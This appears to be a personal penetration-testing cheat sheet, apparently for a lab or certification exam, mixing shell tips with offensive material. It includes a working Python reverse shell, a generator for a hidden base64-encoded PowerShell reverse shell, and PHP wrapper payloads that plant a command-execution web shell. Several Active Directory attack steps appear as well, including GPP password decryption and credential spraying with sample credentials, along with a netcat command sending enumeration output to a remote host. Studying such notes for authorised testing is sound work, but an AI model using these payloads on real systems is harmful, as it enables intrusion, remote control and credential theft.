### to add to a file without nano 
cat <<'EOT'> file.name
> text
> text
> EOT
(the EOT ends the file)

###  Useful Python reverse shell
Try when others aren't working.  
`python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.235",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")"`
- same as Python #2 from rev shells, but with the interior `"`'s escaped with `\`'s

### Cron jobs - linpeas

```
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                                                                     
/usr/bin/crontab                                                                                                                                                                                                                           
incrontab Not Found
-rw-r--r-- 1 root root   74 Oct 31  2019 /etc/cron.deny                                                                                                                                                                                    
-rw-r--r-- 1 root root   66 Jan 15  2021 /etc/crontab.bak

/etc/cron.d:
total 12
drwxr-xr-x  2 root root 4096 Nov  5  2020 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..
-rw-r--r--  1 root root  128 Oct 31  2019 0hourly

/etc/cron.daily:
total 8
drwxr-xr-x  2 root root 4096 Oct 31  2019 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Nov  5  2020 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..
-rwxr-xr-x  1 root root  580 Oct 31  2019 0anacron

/etc/cron.monthly:
total 8
drwxr-xr-x  2 root root 4096 Oct 31  2019 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..

/etc/cron.weekly:
total 8
drwxr-xr-x  2 root root 4096 Oct 31  2019 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..

/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Nov  6  2020 .
drwxr-xr-x 6 root root 4096 Nov  6  2020 ..
-rw------- 1 root root    9 Jul 27 17:08 cron.daily
-rw------- 1 root root    9 Jul 27 17:48 cron.monthly
-rw------- 1 root root    9 Jul 27 17:28 cron.weekly
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh


SHELL=/bin/sh
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
RANDOM_DELAY=45
START_HOURS_RANGE=3-22

```

This means that pull.sh is executed every two minutes, and backups.sh is every 3 minutes. 


### Python Errors
#### Wrong Modules
1. `sudo apt-get install python3-venv`
2. `python3 -m venv myenv`
3. `source myenv/bin/activate`
4. Then install what you actually need:
	1. `pip install -r requirements.txt` OR
	2. - `pip install requests urllib3==1.26.8 charset_normalizer==2.0.12` With specific modules named
5.  `python $script.py`
6.  `deactivate`

#### SSL Error
Run these three commands:
1. `export PYTHONWARNINGS="ignore:Unverified HTTPS request"`
2. `export REQUESTS_CA_BUNDLE=""`
3. `export CURL_CA_BUNDLE=""`
	1. Note that these variables are set temporarily with that terminal session, but could be reversed by repeating the command with `unset` instead of `export`


#### Generate base64 shell
```
import sys
import base64

payload = '$client = New-Object

System.Net.Sockets.TCPClient("__**192.168.118.2**__",__**443**__);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```


### PHP Wrappers
These become relevant when a php page in a browser is requesting another php file, such as in the case of `http://example.com/index.php?page=config.php`

Full page:
`http://example.com/index.php?page=php://filter/resource=config.php`

Base64:
`http://example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config`
- You may not need the .php at the end

Data:
`http://example.com/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>`
- But this may be blocked so we can try with base64:
	- `echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
		- Output: `PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==`
- `http://example.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`

### Time Saving Enumeration
Windows:
- `tree /f /a`- to list all files in directories and subdirectories

Linux:
- `CTRL + r` - search through previous commands
- `tree` similar to `find .`
- `CTRL + Shift + L` to move command line to top of the screen so you can see the results better
- `smbclient //<IP>/<share_name> -c 'recurse;ls'`. This will recursively list all the files in the share, allowing you to quickly check if there is anything useful.

### Misc
When applications like Exchange, MS SQL, or Internet Information Services (IIS) are integrated into AD, a unique service instance identifier known as Service Principal Name (SPN) associates a service to a specific service account in Active Directory.

Another way of enumerating SPNs is to let PowerView enumerate all the accounts in the domain. To obtain a clear list of SPNs, we can pipe the output into select and choose the samaccountname and serviceprincipalname attributes.
`Get-NetUser -SPN | select samaccountname,serviceprincipalname`

We can use PowerView’s Convert-SidToName command to convert it to an actual domain object:
`Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`

Find-DomainShare function to find the shares in the domain. We could also add the -CheckShareAccess flag to display shares only available to us
- probably not that useful for the exam
- `ls \\dc1.corp.com\sysvol\corp.com\Policies\` if we can though

Historically, system administrators often changed local workstation passwords through Group_Policy Preferences. XML file that says `cpassword= blahblah.` Hashes like this require gpp-decrypt:
`+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE`

If an account has `Do not require Kerberos preauthentication` - we can perform AS-REP roasting

SPN means that it's running as a service

**be sure to include --rdp-timeout 30 whenever you are spraying rdp creds with nxc** - same with xfreerdp (`--rdp-timeout`)

List everything: 
- Linux (bash): `ls -la`
- Windows (cmd): `dir /a`
- Windows (powershell): `Get-ChildItem -Force` or `gci -Force` or `dir -Force`

To prevent hanging while running Windows commands:
- `cmd.exe /c <commands>  
- `cmd.exe /c start <commands>`

To prevent hanging while running Linux commands:
- `your_command &`
- `your_command &` then `disown`

Check Groups.xml on SYSVOL for `cpassword` then:
- `gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`
- Also with nxc:
	- `crackmapexec smb -L | grep gpp`
	- `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin`

Pipe Linpeas output to remote kali host:
- On kali:  `nc -l -p 1234 > linpeas.txt`
- On target: `./linpeas.sh | nc 10.10.10.60 1234 &`
